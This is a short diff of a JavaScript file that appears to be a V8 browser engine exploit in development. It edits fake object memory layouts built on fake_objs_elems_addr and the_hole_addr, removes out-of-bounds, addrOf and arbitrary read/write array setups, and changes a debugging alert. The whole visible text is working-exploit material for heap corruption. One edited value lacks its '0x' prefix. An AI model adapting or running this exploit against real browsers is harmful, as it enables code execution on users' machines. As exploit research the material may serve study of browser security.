@@ -31,23 +31,23 @@
 //   /* +0x10 */ p64f(0x000063d5, 0x00000000), // PromiseReaction  // 0x004fb35
 //   /* +0x18 */ p64f(0x000023e9, fake_objs_elems_addr + 0x28),
 //   /* +0x20 */ p64f(0x000023e9, 0x000023e9), // ?
-//   /* +0x28 */ p64f(0x002022d9, 0x00002261), // Function
-//   /* +0x30 */ p64f(0x00002261, 0x001457a5), 
-//   /* +0x38 */ p64f(fake_objs_elems_addr + 0x48, 0x001445cd),
-//   /* +0x40 */ p64f(0x00148019, 0x0),
-//   /* +0x48 */ p64f(0x00204511, 0x00000006), // Context
+//   /* +0x28 */ p64f(0x00242329, 0x00002261), // Function
+//   /* +0x30 */ p64f(0x00002261, 0014e9f1), 
+//   /* +0x38 */ p64f(fake_objs_elems_addr + 0x48, 0014d819),
+//   /* +0x40 */ p64f(0x001cf939, 0x0),
+//   /* +0x48 */ p64f(0x002448f9, 0x00000006), // Context
 //   /* +0x50 */ p64f(0x00003661, 0x00003661),
 //   /* +0x58 */ p64f(fake_objs_elems_addr + 0x60, 0x0),
-//   /* +0x60 */ p64f(0x00203e81, 0x00002261), // JSGeneratorObject
+//   /* +0x60 */ p64f(0x002441c9, 0x00002261), // JSGeneratorObject
 //   /* +0x68 */ p64f(0x00002261, fake_objs_elems_addr + 0x90), // sloppy_function
-//   /* +0x70 */ p64f(0x001d3c4d, fake_objs_elems_addr),
-//   /* +0x78 */ p64f(0x41414141, 0xdeadbeef),
+//   /* +0x70 */ p64f(0x004a3471, fake_objs_elems_addr), // receiver
+//   /* +0x78 */ p64f(0x188, 0x0),
 //   /* +0x80 */ p64f(0x00000000, 0x23232323),  // elements
 //   /* +0x88 */ p64f(the_hole_addr, the_hole_addr), 
-//   /* +0x90 */ p64f(0x002022d9, 0x00002261), // SloppyFunction 
-//   /* +0x98 */ p64f(0x00002261, 0x001d4875), 
-//   /* +0xa0 */ p64f(0x001d4ff1, 0x001d4e95), 
-//   /* +0xa8 */ p64f(0x00146eb9, 0x00006605), 
+//   /* +0x90 */ p64f(0x00242329, 0x00002261), // SloppyFunction 
+//   /* +0x98 */ p64f(0x00002261, 0x002b63f1), 
+//   /* +0xa0 */ p64f(0x002b6b79, 0x002b6a1d), 
+//   /* +0xa8 */ p64f(0x001ce7d9, 0x00000600), 
 // ];
 
 // const fake_js_promise = 
@@ -401,16 +401,13 @@ const thehole_addr = fake_objs_elems_addr+0xc;
 debug_ref.push(ref);
 
 const mark_obj = {mark:0x13371337,mark1:0x1717dead,obj:{}};
-var oob_arr_draft = [2.1];
-var addrOf_dict = [{},{},2.2,];
-var aarw_arr = [1.1,2.2,3.3];
 const sloppy_func = () => {};
 // %DebugPrint(mark_obj);
 // %DebugPrint(mark_obj);
 // %DebugPrint(%TheHole());
 // %DebugPrint(fake_obj_str);
 // %DebugPrint(sloppy_func);
-alert("begin")
+alert("begin1")
 // %SystemBreak();
 // %DebugPrint(sloppy_func);
 var oob_arr;
